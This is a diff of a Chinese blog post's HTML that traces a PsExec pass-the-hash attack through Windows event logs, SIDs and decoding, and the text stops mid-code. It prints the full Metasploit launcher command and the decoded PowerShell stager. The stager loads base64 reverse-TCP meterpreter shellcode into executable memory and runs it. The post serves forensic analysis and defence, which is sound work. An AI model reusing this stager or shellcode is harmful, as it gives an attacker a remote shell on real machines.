@@ -201,260 +201,283 @@
         </header>
 
         <div class="post-content">
-            <h1 id="Psexec溯源"><a href="#Psexec溯源" class="headerlink" title="Psexec溯源"></a>Psexec溯源</h1><p>本文目的为记述攻防模拟中Psexec执行后的溯源知识点。</p>
-<h2 id="1-安全日志解析"><a href="#1-安全日志解析" class="headerlink" title="1. 安全日志解析"></a>1. 安全日志解析</h2><p>使用Metasplot中的<code>/exploit/windows/smb/psexec_psh</code>模块，payload为<code>meterpreter/reverse_tcp</code>进行Pth攻击。</p>
+            <h1 id="psexec溯源">Psexec溯源</h1>
+<p>本文目的为记述攻防模拟中Psexec执行后的溯源知识点。</p>
+<h2 id="安全日志解析">1. 安全日志解析</h2>
+<p>使用Metasplot中的<code>/exploit/windows/smb/psexec_psh</code>模块，payload为<code>meterpreter/reverse_tcp</code>进行Pth攻击。</p>
 <p>在靶机上的日志<code>windows日志-&gt;系统日志-&gt;ID 7045</code>会有执行Psexec的记录</p>
-<p><img src="/2020/03/01/Psexec溯源/image-20200325163730525.png" alt="image-20200325163730525"></p>
+<figure>
+<img src="/2020/03/01/Psexec溯源/image-20200325163730525.png" alt="image-20200325163730525">
+<figcaption aria-hidden="true">image-20200325163730525</figcaption>
+</figure>
 <p>查看详细信息，能看到执行的账户信息——<code>SID</code></p>
-<p><img src="/2020/03/01/Psexec溯源/image-20200325172725319.png" alt="image-20200325172725319"></p>
+<figure>
+<img src="/2020/03/01/Psexec溯源/image-20200325172725319.png" alt="image-20200325172725319">
+<figcaption aria-hidden="true">image-20200325172725319</figcaption>
+</figure>
 <p>用WMI查询域内的用户信息<code>SID</code></p>
-<pre><code class="lang-cmd">C:\Users\xxx&gt; wmic useraccount  get sid,Caption
+<pre class="cmd"><code>C:\Users\xxx&gt; wmic useraccount  get sid,Caption
 Caption            SID
 GOD\Administrator  S-1-5-21-2952760202-1353902439-2381784089-500
 GOD\krbtgt         S-1-5-21-2952760202-1353902439-2381784089-502
-GOD\liukaifeng01   S-1-5-21-2952760202-1353902439-2381784089-1000
-</code></pre>
+GOD\liukaifeng01   S-1-5-21-2952760202-1353902439-2381784089-1000</code></pre>
 <p>对照<code>SID</code>可知，是<code>GOD\Administrator</code>执行的远程命令。</p>
 <p>对此，其他安全研究员总结出了其他一些可能会产生的日志，在此作为记录。</p>
 <blockquote>
-<ol>
-<li><p>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697和Event 7045这两种事件日志。需要注意的是，Event 4697日志记录将有可能包含账号信息。</p>
-</li>
-<li><p>还有可能预生成Event 4624和Event 4652 Windows事件日志，日志会记录下该工具的使用数据。</p>
-</li>
-<li><p>可执行程序PSEXESVC.EXE将会被提取至Windows目录下，然后再执行远程操作。</p>
-</li>
+<ol type="1">
+<li><p>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697和Event
+7045这两种事件日志。需要注意的是，Event
+4697日志记录将有可能包含账号信息。</p></li>
+<li><p>还有可能预生成Event 4624和Event 4652
+Windows事件日志，日志会记录下该工具的使用数据。</p></li>
+<li><p>可执行程序PSEXESVC.EXE将会被提取至Windows目录下，然后再执行远程操作。</p></li>
 </ol>
-<p><a href="https://kknews.cc/tech/qeqk8py.html" target="_blank" rel="noopener">https://kknews.cc/tech/qeqk8py.html</a></p>
+<p>https://kknews.cc/tech/qeqk8py.html</p>
 </blockquote>
-<h2 id="2-解码powershell"><a href="#2-解码powershell" class="headerlink" title="2. 解码powershell"></a>2. 解码powershell</h2><p>再来继续追查执行的powershell代码。</p>
+<h2 id="解码powershell">2. 解码powershell</h2>
+<p>再来继续追查执行的powershell代码。</p>
 <pre><code>服务名称: KyXUNYhzWKXprClF
-%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &quot;if([IntPtr]::Size -eq 4){$b=&#39;powershell.exe&#39;}else{$b=$env:windir+&#39;\syswow64\WindowsPowerShell\v1.0\powershell.exe&#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&#39;-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIAAUHe14CA7VW+2/aSBD+uZHyP1gVErZCMA40aSJVujVvggnEQHgUnRZ7bS9Ze8Fe8+r1f78x4DRV07v2pLPyWO/OzM58882MnTiwBOWBtLimnvTl/OxdF4fYl+TMhtRyUmb7JzOUd+9gP+N0htsr6ZMkT9FyWeE+psHs7q4chyEJxPE9XycCRRHx54ySSFakv6Qnj4Tk8mG+IJaQvkiZP/N1xueYncR2ZWx5RLpEgZ2ctbmFE3fy5pJRIWc/f84q00ttlq+uYswiOWvuIkH8vM1YVpG+KsmF/d2SyFmDWiGPuCPyTzQoXuUHQYQd0gFra2IQ4XE7yioQBvyERMRhIB0DSiwcz+UsLLsht5BthySKsjlpmtiezmZ/yNPTxY9xIKhP8s1AkJAvTRKuqUWifAMHNiOPxJmBlilCGrgzRQGxNX8mciaIGctJv2NG7pBNCtuvKsmvlUCqK0IlB6l8K1CD2zEjR9XsG54m+VfgSTkA2H09Pzs/c1LCOA/XndeEgdW76WFNwD25yyN6kPskFXKSAfdgwcMdvGb6YUyU2Qu4UiY0y5Pcz/W1VBhE9x2/CFvTIaf2DFROKc2wtcFXycHPuVkhDg1IZRdgn1op/eS3cCYOI4cg86lYB7ySs6cDYlcIIy4WCXBJun9Qq/pUvOjqMWU2CZEFuYrAK0ij8r0zx1zI2WZgEB9AOr4D/zIOkJ6k0iei79Lbk3cQypYZjqKc1I2h6qycZBLMiJ2TUBDR0xGKBT8ss9/cNWImqIUjkZqbKS9Ani4s8yASYWxB4iD4vrkkFsUswSInNahN9J1J3fTi7JtIlDFjUAtgaQ2ZgJ0EAVMkdAjBx0PqlbxJRNNfMuKDzKH+awy7UO0nxh/4g11iZ39wMWX0kb4JGikMrxyEFJuMi5w0pKGAPpIgmxDpv93/qoMcPSmH5JQNOa2Sqb4TCbcz9npLbhNenqA5ABEKAKEWcl/HEbkuHduF/F59oGUEz7gZMMPSn6mGNlRrGvA7oMUmr9zY961FQw0rW89BzahpNLqVXqNRWrfMYUmY1aa47zaFUR0tFiZqPA7GYtJEjT4tPI9L+2WL7s02ssdb9Xqv7zcFfbtfuLYzrjiOe+OYj9qHGm0/lXt64Qq3K9W4/aRv9EIpqtJNo0cHvedWTczHQ4YHjuqOtFtMt+1wMdS4sW8iVPeK1r7lDOueYe/GDUoWaqFNe6iH0L31OBjU3aVbj5B6O1yV/QVaVcwuRuCdX259YHpvUNPRoKr38APvFi8qqjaxV9XaZIRbPrPrDVUbj5CNQrXvetrNgxckOGFXX+mJDGpPdjUVZLol1Chd0f1k1au7qAoyQ58jXKPPg4sR2Oz0QedpoNkciaA5UtWhq7rIMb0xRjpI6ytU03l597FrdNXh8MrT5s+aBz6T0fqj0UIXNaurquqFP4e/KrKM5TYY6Zubtdsw+T2+x8P1pKhq/U3dQSt0caFr+lw0qsXWGu7tq7eDT+8TBgGFMhy9YsXPOruBw8jDDNgCHTut0xoPa6cm3OU00ZDlw/R+JmFAGMw+mI4p1RFj3EqGwKFdwwA6joVkSg1gWbx6c6VIL4LKt9mQbt3dTcBLKJ4DufNtErjCyxW2xUIBWn1hWypAkL8eWpkvd/LRVi6ZFQDNi212sK0kJZWZs0H19v8F7VTJHvyz/w20b3v/cPpLQBZyScg/bH6/8VuQ/nbgT5gKkDShDzFynIZvx3/ix6sPhkNaIPvO6Uk++h5icdmBD4nzs78BLEJS2GAKAAA=&#39;&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);&quot;
-</code></pre><p>代码有点绕，我们可以直接使用 Unit42安全团队的powershell自动反混淆工具 </p>
-<p><a href="https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler" target="_blank" rel="noopener">https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler</a> </p>
-<pre><code>python3 PowerShellProfiler.py -f ./test_power.txt -d
-</code></pre><p>然后就可以直接看到要执行的核心powershell代码</p>
-<p><img src="/2020/03/01/Psexec溯源/image-20200325164205204.png" alt="image-20200325164205204"></p>
-<p>当然我们也可以按照函数的本意，在这里 <a href="https://gchq.github.io/CyberChef" target="_blank" rel="noopener">https://gchq.github.io/CyberChef</a> 按照代码逻辑一步一步decode。</p>
+%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &quot;if([IntPtr]::Size -eq 4){$b=&#39;powershell.exe&#39;}else{$b=$env:windir+&#39;\syswow64\WindowsPowerShell\v1.0\powershell.exe&#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&#39;-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIAAUHe14CA7VW+2/aSBD+uZHyP1gVErZCMA40aSJVujVvggnEQHgUnRZ7bS9Ze8Fe8+r1f78x4DRV07v2pLPyWO/OzM58882MnTiwBOWBtLimnvTl/OxdF4fYl+TMhtRyUmb7JzOUd+9gP+N0htsr6ZMkT9FyWeE+psHs7q4chyEJxPE9XycCRRHx54ySSFakv6Qnj4Tk8mG+IJaQvkiZP/N1xueYncR2ZWx5RLpEgZ2ctbmFE3fy5pJRIWc/f84q00ttlq+uYswiOWvuIkH8vM1YVpG+KsmF/d2SyFmDWiGPuCPyTzQoXuUHQYQd0gFra2IQ4XE7yioQBvyERMRhIB0DSiwcz+UsLLsht5BthySKsjlpmtiezmZ/yNPTxY9xIKhP8s1AkJAvTRKuqUWifAMHNiOPxJmBlilCGrgzRQGxNX8mciaIGctJv2NG7pBNCtuvKsmvlUCqK0IlB6l8K1CD2zEjR9XsG54m+VfgSTkA2H09Pzs/c1LCOA/XndeEgdW76WFNwD25yyN6kPskFXKSAfdgwcMdvGb6YUyU2Qu4UiY0y5Pcz/W1VBhE9x2/CFvTIaf2DFROKc2wtcFXycHPuVkhDg1IZRdgn1op/eS3cCYOI4cg86lYB7ySs6cDYlcIIy4WCXBJun9Qq/pUvOjqMWU2CZEFuYrAK0ij8r0zx1zI2WZgEB9AOr4D/zIOkJ6k0iei79Lbk3cQypYZjqKc1I2h6qycZBLMiJ2TUBDR0xGKBT8ss9/cNWImqIUjkZqbKS9Ani4s8yASYWxB4iD4vrkkFsUswSInNahN9J1J3fTi7JtIlDFjUAtgaQ2ZgJ0EAVMkdAjBx0PqlbxJRNNfMuKDzKH+awy7UO0nxh/4g11iZ39wMWX0kb4JGikMrxyEFJuMi5w0pKGAPpIgmxDpv93/qoMcPSmH5JQNOa2Sqb4TCbcz9npLbhNenqA5ABEKAKEWcl/HEbkuHduF/F59oGUEz7gZMMPSn6mGNlRrGvA7oMUmr9zY961FQw0rW89BzahpNLqVXqNRWrfMYUmY1aa47zaFUR0tFiZqPA7GYtJEjT4tPI9L+2WL7s02ssdb9Xqv7zcFfbtfuLYzrjiOe+OYj9qHGm0/lXt64Qq3K9W4/aRv9EIpqtJNo0cHvedWTczHQ4YHjuqOtFtMt+1wMdS4sW8iVPeK1r7lDOueYe/GDUoWaqFNe6iH0L31OBjU3aVbj5B6O1yV/QVaVcwuRuCdX259YHpvUNPRoKr38APvFi8qqjaxV9XaZIRbPrPrDVUbj5CNQrXvetrNgxckOGFXX+mJDGpPdjUVZLol1Chd0f1k1au7qAoyQ58jXKPPg4sR2Oz0QedpoNkciaA5UtWhq7rIMb0xRjpI6ytU03l597FrdNXh8MrT5s+aBz6T0fqj0UIXNaurquqFP4e/KrKM5TYY6Zubtdsw+T2+x8P1pKhq/U3dQSt0caFr+lw0qsXWGu7tq7eDT+8TBgGFMhy9YsXPOruBw8jDDNgCHTut0xoPa6cm3OU00ZDlw/R+JmFAGMw+mI4p1RFj3EqGwKFdwwA6joVkSg1gWbx6c6VIL4LKt9mQbt3dTcBLKJ4DufNtErjCyxW2xUIBWn1hWypAkL8eWpkvd/LRVi6ZFQDNi212sK0kJZWZs0H19v8F7VTJHvyz/w20b3v/cPpLQBZyScg/bH6/8VuQ/nbgT5gKkDShDzFynIZvx3/ix6sPhkNaIPvO6Uk++h5icdmBD4nzs78BLEJS2GAKAAA=&#39;&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);&quot;</code></pre>
+<p>代码有点绕，我们可以直接使用
+Unit42安全团队的powershell自动反混淆工具</p>
+<p>https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler</p>
+<pre><code>python3 PowerShellProfiler.py -f ./test_power.txt -d</code></pre>
+<p>然后就可以直接看到要执行的核心powershell代码</p>
+<figure>
+<img src="/2020/03/01/Psexec溯源/image-20200325164205204.png" alt="image-20200325164205204">
+<figcaption aria-hidden="true">image-20200325164205204</figcaption>
+</figure>
+<p>当然我们也可以按照函数的本意，在这里 https://gchq.github.io/CyberChef
+按照代码逻辑一步一步decode。</p>
 <p>锻炼一下动手能力 ：)</p>
 <p>FromBase64 + Gunzip</p>
-<p><img src="/2020/03/01/Psexec溯源/image-20200325164827994.png" alt="image-20200325164827994"></p>
+<figure>
+<img src="/2020/03/01/Psexec溯源/image-20200325164827994.png" alt="image-20200325164827994">
+<figcaption aria-hidden="true">image-20200325164827994</figcaption>
+</figure>
 <p>于是我们得到核心powershell代码，如下：</p>
-<pre><code class="lang-powershell">function j6ih {
-    Param ($weF, $x_lM)        
-    $fNVx2 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where - Object {
-        $_.GlobalAssemblyCache  - And $_.Location.Split(&#39;\\&#39;)[ - 1].Equals(&#39;System.dll&#39;) 
-    }
-
-    ).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;)
-    return $fNVx2.GetMethod(&#39;GetProcAddress&#39;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New - Object System.Runtime.InteropServices.HandleRef((New - Object IntPtr), ($fNVx2.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($weF)))), $x_lM))
-}
-
-function fO6N {
-    Param (
-    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $rSCZ, [Parameter(Position = 1)] [Type] $zNm3 = [Void]
-    )
-    $lvMoq = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New - Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate])
-    $lvMoq.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $rSCZ).SetImplementationFlags(&#39;Runtime, Managed&#39;)
-    $lvMoq.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $zNm3, $rSCZ).SetImplementationFlags(&#39;Runtime, Managed&#39;)
-    return $lvMoq.CreateType()
-}
-
-[Byte[]]$dvxe9 = [System.Convert]::FromBase64String(&quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqDSPaAIAHmCJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=&quot;)
-
-$oA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll VirtualAlloc), (fO6N @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dvxe9.Length, 0x3000, 0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($dvxe9, 0, $oA, $dvxe9.length)
-$blUE9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll CreateThread), (fO6N @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $oA, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll WaitForSingleObject), (fO6N @([IntPtr], [Int32]))).Invoke($blUE9, 0xffffffff) | Out - Null
-</code></pre>
-<h2 id="3-ShellCode"><a href="#3-ShellCode" class="headerlink" title="3. ShellCode"></a>3. ShellCode</h2><p>从<code>kernel32.dll</code>和<code>VirtualAlloc</code>容易判断出，变量<code>$dvxe9</code>是Base64后的Shellcode。</p>
-<p>用python Base64解一下，变成<code>\x00\xff\x12\x33</code>这样的十六进制格式，方便后续解码。</p>
-<pre><code class="lang-python">&gt;&gt;&gt; from base64 import b64decode as d
-&gt;&gt;&gt; code = &quot;&quot;
-&gt;&gt;&gt; print(&quot;&quot;.join(list(map(lambda y:&quot;\\x%x&quot;%y,d(code)))))
-</code></pre>
+<div class="sourceCode" id="cb4"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> j6ih <span class="op">{</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">Param</span> <span class="op">(</span><span class="va">$weF</span><span class="op">,</span> <span class="va">$x_lM</span><span class="op">)</span>     </span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$fNVx2</span> <span class="op">=</span> <span class="op">([</span>AppDomain<span class="op">]::</span>CurrentDomain<span class="op">.</span><span class="fu">GetAssemblies</span><span class="op">()</span> <span class="op">|</span> <span class="fu">Where</span> <span class="op">-</span> <span class="dt">Object</span> <span class="op">{</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>        <span class="va">$_</span><span class="op">.</span><span class="fu">GlobalAssemblyCache</span>  <span class="op">-</span> And <span class="va">$_</span><span class="op">.</span><span class="fu">Location</span><span class="op">.</span><span class="fu">Split</span><span class="op">(</span>&#39;\\&#39;<span class="op">)[</span> <span class="op">-</span> 1<span class="op">].</span><span class="fu">Equals</span><span class="op">(</span>&#39;System<span class="op">.</span><span class="fu">dll</span>&#39;<span class="op">)</span> </span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">).</span><span class="fu">GetType</span><span class="op">(</span>&#39;Microsoft<span class="op">.</span><span class="fu">Win32</span><span class="op">.</span><span class="fu">UnsafeNativeMethods</span>&#39;<span class="op">)</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">return</span> <span class="va">$fNVx2</span><span class="op">.</span><span class="fu">GetMethod</span><span class="op">(</span>&#39;GetProcAddress&#39;<span class="op">,</span> <span class="op">[</span><span class="fu">Type</span><span class="op">[]]</span>@<span class="op">([</span>System<span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">InteropServices</span><span class="op">.</span><span class="fu">HandleRef</span><span class="op">],</span> <span class="op">[</span><span class="dt">String</span><span class="op">])).</span><span class="fu">Invoke</span><span class="op">(</span><span class="va">$null</span><span class="op">,</span> @<span class="op">([</span>System<span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">InteropServices</span><span class="op">.</span><span class="fu">HandleRef</span><span class="op">](</span>New <span class="op">-</span> <span class="dt">Object</span> System<span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">InteropServices</span><span class="op">.</span><span class="fu">HandleRef</span><span class="op">((</span>New <span class="op">-</span> <span class="dt">Object</span> IntPtr<span class="op">),</span> <span class="op">(</span><span class="va">$fNVx2</span><span class="op">.</span><span class="fu">GetMethod</span><span class="op">(</span>&#39;GetModuleHandle&#39;<span class="op">)).</span><span class="fu">Invoke</span><span class="op">(</span><span class="va">$null</span><span class="op">,</span> @<span class="op">(</span><span class="va">$weF</span><span class="op">)))),</span> <span class="va">$x_lM</span><span class="op">))</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> fO6N <span class="op">{</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">Param</span> <span class="op">(</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">[</span>Parameter<span class="op">(</span>Position <span class="op">=</span> 0<span class="op">,</span> Mandatory <span class="op">=</span> <span class="va">$True</span><span class="op">)]</span> <span class="op">[</span><span class="fu">Type</span><span class="op">[]]</span> <span class="va">$rSCZ</span><span class="op">,</span> <span class="op">[</span>Parameter<span class="op">(</span>Position <span class="op">=</span> 1<span class="op">)]</span> <span class="op">[</span><span class="fu">Type</span><span class="op">]</span> <span class="va">$zNm3</span> <span class="op">=</span> <span class="op">[</span>Void<span class="op">]</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">)</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>    <span class="va">$lvMoq</span> <span class="op">=</span> <span class="op">[</span>AppDomain<span class="op">]::</span>CurrentDomain<span class="op">.</span><span class="fu">DefineDynamicAssembly</span><span class="op">((</span>New <span class="op">-</span> <span class="dt">Object</span> System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">AssemblyName</span><span class="op">(</span>&#39;ReflectedDelegate&#39;<span class="op">)),</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">Emit</span><span class="op">.</span><span class="fu">AssemblyBuilderAccess</span><span class="op">]::</span>Run<span class="op">).</span><span class="fu">DefineDynamicModule</span><span class="op">(</span>&#39;InMemoryModule&#39;<span class="op">,</span> <span class="va">$false</span><span class="op">).</span><span class="fu">DefineType</span><span class="op">(</span>&#39;MyDelegateType&#39;<span class="op">,</span> &#39;Class<span class="op">,</span> Public<span class="op">,</span> Sealed<span class="op">,</span> AnsiClass<span class="op">,</span> AutoClass&#39;<span class="op">,</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">MulticastDelegate</span><span class="op">])</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>    <span class="va">$lvMoq</span><span class="op">.</span><span class="fu">DefineConstructor</span><span class="op">(</span>&#39;RTSpecialName<span class="op">,</span> HideBySig<span class="op">,</span> Public&#39;<span class="op">,</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">CallingConventions</span><span class="op">]::</span>Standard<span class="op">,</span> <span class="va">$rSCZ</span><span class="op">).</span><span class="fu">SetImplementationFlags</span><span class="op">(</span>&#39;Runtime<span class="op">,</span> Managed&#39;<span class="op">)</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>    <span class="va">$lvMoq</span><span class="op">.</span><span class="fu">DefineMethod</span><span class="op">(</span>&#39;Invoke&#39;<span class="op">,</span> &#39;Public<span class="op">,</span> HideBySig<span class="op">,</span> NewSlot<span class="op">,</span> Virtual&#39;<span class="op">,</span> <span class="va">$zNm3</span><span class="op">,</span> <span class="va">$rSCZ</span><span class="op">).</span><span class="fu">SetImplementationFlags</span><span class="op">(</span>&#39;Runtime<span class="op">,</span> Managed&#39;<span class="op">)</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>    <span class="kw">return</span> <span class="va">$lvMoq</span><span class="op">.</span><span class="fu">CreateType</span><span class="op">()</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a><span class="op">[</span><span class="dt">Byte</span><span class="op">[]]</span><span class="va">$dvxe9</span> <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Convert</span><span class="op">]::</span>FromBase64String<span class="op">(</span><span class="st">&quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqDSPaAIAHmCJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=&quot;</span><span class="op">)</span></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a><span class="va">$oA</span> <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">InteropServices</span><span class="op">.</span><span class="fu">Marshal</span><span class="op">]::</span>GetDelegateForFunctionPointer<span class="op">((</span>j6ih kernel32<span class="op">.</span><span class="fu">dll</span> VirtualAlloc<span class="op">),</span> <span class="op">(</span>fO6N @<span class="op">([</span>IntPtr<span class="op">],</span> <span class="op">[</span>UInt32<span class="op">],</span> <span class="op">[</span>UInt32<span class="op">],</span> <span class="op">[</span>UInt32<span class="op">])</span> <span class="op">([</span>IntPtr<span class="op">]))).</span><span class="fu">Invoke</span><span class="op">([</span>IntPtr<span class="op">]::</span>Zero<span class="op">,</span> <span class="va">$dvxe9</span><span class="op">.</span><span class="fu">Length</span><span class="op">,</span> 0x3000<span class="op">,</span> 0x40<span class="op">)</span></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>System<span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">InteropServices</span><span class="op">.</span><span class="fu">Marshal</span><span class="op">]::</span>Copy<span class="op">(</span><span class="va">$dvxe9</span><span class="op">,</span> 0<span class="op">,</span> <span class="va">$oA</span><span class="op">,</span> <span class="va">$dvxe9</span><span class="op">.</span><span class="fu">length</span><span class="op">)</span></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a><span class="va">$blUE9</span> <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">InteropServices</span><span class="op">.</span><span class="fu">Marshal</span><span class="op">]::</span>GetDelegateForFunctionPointer<span class="op">((</span>j6ih kernel32<span class="op">.</span><span class="fu">dll</span> CreateThread<span class="op">),</span> <span class="op">(</span>fO6N @<span class="op">([</span>IntPtr<span class="op">],</span> <span class="op">[</span>UInt32<span class="op">],</span> <span class="op">[</span>IntPtr<span class="op">],</span> <span class="op">[</span>IntPtr<span class="op">],</span> <span class="op">[</span>UInt32<span class="op">],</span> <span class="op">[</span>IntPtr<span class="op">])</span> <span class="op">([</span>IntPtr<span class="op">]))).</span><span class="fu">Invoke</span><span class="op">([</span>IntPtr<span class="op">]::</span>Zero<span class="op">,</span> 0<span class="op">,</span> <span class="va">$oA</span><span class="op">,</span> <span class="op">[</span>IntPtr<span class="op">]::</span>Zero<span class="op">,</span> 0<span class="op">,</span> <span class="op">[</span>IntPtr<span class="op">]::</span>Zero<span class="op">)</span></span>
